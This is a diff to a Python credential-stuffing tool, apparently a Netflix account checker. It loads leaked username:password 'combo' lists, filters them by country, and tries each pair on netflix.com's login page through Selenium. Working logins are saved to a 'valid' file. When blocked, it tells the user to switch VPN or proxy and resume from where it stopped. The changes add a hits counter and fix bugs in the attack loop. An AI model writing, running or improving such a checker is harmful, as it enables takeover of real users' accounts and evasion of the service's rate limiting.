@@ -1,6 +1,7 @@
 import time
 import requests
 import os
+import sys
 from split_method import determine_split_method
 from split_method import return_error
 from pathlib import Path
@@ -13,9 +14,9 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 
 details = [find_IP()[0], find_IP()[1], find_IP()[2]]
-split_method_has_a_country = False
 current_split_method = determine_split_method()
 counter = 0
+hits = 0
 user =[]
 passw =[]
 updated_list=[]
@@ -25,17 +26,21 @@ clear_page = 0
 directory = str(Path(__file__).parent)
 
 def print_ip_and_country():
+
+	split_method_has_a_country = False
 	if current_split_method != "None" and current_split_method != ";" and current_split_method != " |":
 		if isinstance(details[2], list):
 			print("\n\033[38;5;7mCurrent IP: {} : {} | Fetching {}/{} accounts\n".format(details[0], details[1], *details[2]))
 		else:
 			print("\n\033[38;5;7mCurrent IP: {} : {} | Fetching {} accounts\n".format(details[0], details[1], details[2]))
 		split_method_has_a_country = True
-		return split_method_has_a_country
 	else:
 		print("\n\033[38;5;7mCurrent IP: {} : {} | No Countries in Combo\n".format(details[0], details[1]))
+	return split_method_has_a_country
+	
 for file_ in os.listdir(directory):
-	files.append(file_)	
+	files.append(file_)
+	
 for file_ in range(len(files)):
 	if 'resume' in files[file_]:
 		resume_flag = True
@@ -45,28 +50,36 @@ for file_ in range(len(files)):
 				passw.append(line.split(":")[1])
 		break
 	if file_ == len(files)-1:
-		with open('netflix','r') as net:
+		with open('netflix','r') as net:	
+			
 			for line in net.readlines():
-				if isinstance(details[2], list):
+
+				if isinstance(details[2], list) and current_split_method != "None":
 					if [country for country in details[2] if(country in line)]:
 						user.append(line.split(":")[0])
-						passw.append(line.split(":")[1].split(current_split_method)[0].strip())				
-				elif details[2] in line and current_split_method != ";":
+						passw.append(line.split(":")[1].split(current_split_method)[0].strip())		
+	
+				if isinstance(details[2], list) == False:
+					if details[2]in line and current_split_method != ";":
+						user.append(line.split(":")[0])
+						passw.append(line.split(":")[1].split(current_split_method)[0].strip())
+					
+				if current_split_method == " |":
 					user.append(line.split(":")[0])
 					passw.append(line.split(":")[1].split(current_split_method)[0].strip())
-				elif current_split_method == " |":
-					user.append(line.split(":")[0])
-					passw.append(line.split(":")[1].split(current_split_method)[0].strip())
-				elif current_split_method == ";":
+					
+				if current_split_method == ";":
 					user.append(line.split(";")[1].split(";")[0])
 					passw.append(line.split(";")[2].strip())
+					
 				elif current_split_method == "None":
 					user.append(line.split(":")[0])
 					passw.append(line.split(":")[1])
+					
 			for line in range(len(user)):	
 				updated_list.append("{}:{}\n".format(user[line], passw[line].strip()))
 		net.close()
-		
+
 page = "https://www.netflix.com/login"
 while True:
 	counter =0
@@ -74,20 +87,22 @@ while True:
 	return_split_method = print_ip_and_country()
 	user_options()
 	options = input("Pick an option or (q)uit: ")
+	
 	while True:
+	
 		if options == "1":
 			#Account Checker
 			title()
 			if resume_flag == True:
 				print("\033[38;5;7m\nResume file found. Resuming from given combo.")	
-
 			print_ip_and_country()
 			while counter < len(user):
+					
 					if len(user) == 0:
 						print("\n\033[38;5;226mNo Accounts for current country.\n")
 						break
 					try:
-						print("\033[38;5;7m\nConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(str(counter), user[counter], passw[counter].strip()),end='')
+						print("\033[38;5;7m\n\r\rConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(str(counter), user[counter], passw[counter].strip()),end='')
 						browser_options = Options()
 						browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36')
 						browser_options.headless = False
@@ -121,10 +136,11 @@ while True:
 							print("\033[38;5;196m Account Cancelled",end='')
 						if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/h1'):
 							print("\033[38;5;46m Valid Account - Stored",end='')
+							hits += 1
 							with open('valid','a') as valid:
-								valid.write("{}:{}\n".format(user[counter],passw[counter]))						
+								valid.write("{}:{}\n".format(user[counter],passw[counter]))
 						if len(updated_list) > 1:
-							del updated_list[0]							
+							del updated_list[0]		
 						if clear_page > 10:
 							title()
 							print_ip_and_country()
@@ -133,7 +149,10 @@ while True:
 						counter += 1
 						clear_page += 1
 						browser.close()
+						sys.stdout.write("\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s)\x1b8"%(hits, str(counter)))
+						sys.stdout.flush()					
 					except:
+					
 						request = requests.get(page)		
 						if request.status_code == 403:
 							print("\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
@@ -142,11 +161,14 @@ while True:
 									resume.write("{}\n".format(updated_list[line].strip()))
 							resume.close()
 							exit()
+							
 			print("\n\033[38;5;226mAll done.")
 			input("\n\033[38;5;226mPress Enter.")
+			
 			if resume_flag == True:
 				os.remove('resume')
 			break
+			
 		if options == "2":		
 			#Countries List in File and Stats
 			if return_split_method == True:
@@ -164,7 +186,7 @@ while True:
 					while lines_counter < len(combo_lines):
 						# here comes cancer
 						if full_countries_list_from_dict[counter] == 'UK':
-								special_countries ['UK','GB']
+								special_countries = ['UK','GB']
 								if [country for country in special_countries if(country in combo_lines[lines_counter])]:
 									combolist_countries.update({full_countries_list_from_dict[counter]:recurrence})
 									recurrence += 1
@@ -195,7 +217,9 @@ while True:
 				title()
 				input("\033[38;5;7m\n\nNo countries to sort. \nPress Enter to return")
 				break
+				
 		if options == "3":
+		
 			title()
 			try:
 				if return_split_method != "None":
@@ -209,8 +233,10 @@ while True:
 					print("\n\033[38;5;7mThere are no countries included in given combo-list")
 				input("\nPress Enter to Return.")
 			except IndexError:
-				return_error()	
+				return_error()
+				
 		if options == "q":
+		
 			#Exit
 			exit()
 		else:
